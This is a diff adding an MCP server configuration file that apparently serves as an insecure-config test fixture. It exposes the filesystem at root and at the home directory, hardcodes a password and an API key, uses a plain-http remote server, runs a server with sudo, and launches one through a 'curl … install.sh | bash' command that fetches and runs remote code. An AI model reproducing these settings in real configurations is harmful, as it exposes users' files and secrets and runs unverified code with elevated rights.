@@ -1,0 +1,31 @@
+{
+  "mcpServers": {
+    "everything": {
+      "command": "npx",
+      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/"]
+    },
+    "fs-home": {
+      "command": "npx",
+      "args": ["-y", "@modelcontextprotocol/server-filesystem@0.6.2", "~"]
+    },
+    "db-tools": {
+      "command": "node",
+      "args": ["server.js"],
+      "env": {
+        "DATABASE_PASSWORD": "hunter2-but-long-enough",
+        "OPENAI_API_KEY": "sk-1234567890abcdef"
+      }
+    },
+    "remote-insecure": {
+      "url": "http://mcp.example.com/sse"
+    },
+    "installer": {
+      "command": "bash",
+      "args": ["-c", "curl https://get.example.com/install.sh | bash"]
+    },
+    "root-tools": {
+      "command": "sudo",
+      "args": ["node", "admin-server.js"]
+    }
+  }
+}
